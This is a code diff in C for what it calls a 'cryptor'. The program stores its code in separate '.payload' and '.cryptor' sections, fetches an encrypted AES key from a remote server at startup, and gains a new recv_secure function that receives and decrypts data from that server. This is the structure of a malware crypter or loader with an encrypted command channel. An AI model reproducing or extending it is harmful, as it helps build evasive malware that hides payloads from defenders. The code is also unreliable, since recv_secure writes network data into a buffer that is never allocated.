@@ -19,7 +19,7 @@
  * comms to a working state.
  */
 __attribute__((section(".payload"))) int send_secure(BYTE*,ULONG);
-__attribute__((section(".payload"))) int recv_secure(BYTE*,ULONG);
+__attribute__((section(".payload"))) BYTE* recv_secure();
 BYTE* SessionIV;
 BYTE* SessionKEY;
 BCRYPT_KEY_HANDLE SessionKeyHandle;
@@ -47,8 +47,9 @@ __attribute__((section(".payload"))) int payload(){
 	send_secure(tmp,5);
 	tmp = PLStr("data being sent from the cryptor"); 
 	send_secure(tmp,32);
-	printf(PLStr("hello world from the cryptor"));
-	
+	printf(PLStr("hello world from the cryptor\n"));
+	printf("%s\n", recv_secure());
+	printf("%s\n", recv_secure());
 	return 1;
 }
 
@@ -275,7 +276,6 @@ __attribute__((constructor(101), section(".cryptor"))) int construct()
 	/*
 	 * recieve the OTP encrypted AES key from the server
 	 */
-	//recvData = malloc(AESKEYLEN+1);
 	if(!recv(Connection,key,AESKEYLEN,0))
 	{
 		exit(-1);
@@ -507,7 +507,6 @@ __attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
  * destroys the session keys created for this session.
  */
 __attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
-	printf("am i hitting this somehow");
 	/* 
 	 *Destroy the BCrypt key handle
 	 */
@@ -584,8 +583,57 @@ __attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG buf
 	CryptMemFree(Syncronization);
 	return 0;
 }
-__attribute__((section(".payload"))) int recv_secure(BYTE* recvBuffer, ULONG bufferLen){
-
+__attribute__((section(".payload"))) BYTE* recv_secure(){
+	UINT32 recvLen;
+	BYTE* Syncronization = "\x01";
+	BYTE* encryptedBuffer; 
+	BYTE* decryptedBuffer; 
+	ULONG decryptedBufferLen; 
+	ULONG decryptedBufferWriteLen;
+	
+	/*
+	 * send a syncronization byte to the server
+	 *
+	 */
+	if(!send(Connection,(BYTE*)Syncronization,1,0))
+	{
+		return 0;
+	}
+	if(!recv(Connection,(BYTE*)&recvLen,sizeof(UINT32),0))
+	{
+		return 0;
+	}
+	recvLen = ntohl(recvLen);
+	/*
+	 * send a syncronization byte to the server
+	 *
+	 */
+	if(!send(Connection,(BYTE*)Syncronization,1,0))
+	{
+		return 0;
+	}
+	if(!recv(Connection,(BYTE*)encryptedBuffer ,recvLen,MSG_WAITALL))
+	{
+		return 0;
+	}
+	/*
+	 * calculate the length of the decrypted buffer
+	 */
+	if(BCryptDecrypt(SessionKeyHandle,encryptedBuffer,recvLen,NULL,NULL,0,NULL,0,&decryptedBufferLen,0) != STATUS_SUCCESS)
+	{
+		printf("failed\n");
+	}
+	decryptedBuffer = CryptMemAlloc(decryptedBufferLen);
+	if(BCryptDecrypt(SessionKeyHandle,encryptedBuffer,recvLen,NULL,SessionIV,16, decryptedBuffer,decryptedBufferLen,&decryptedBufferWriteLen, 0) != STATUS_SUCCESS)
+	{
+		printf("failed\n");
+	}
+        if(!send(Connection,(BYTE*)SessionIV,16,0))
+        {
+                return 0;
+        }
+	return decryptedBuffer;
+	
 }
 
 
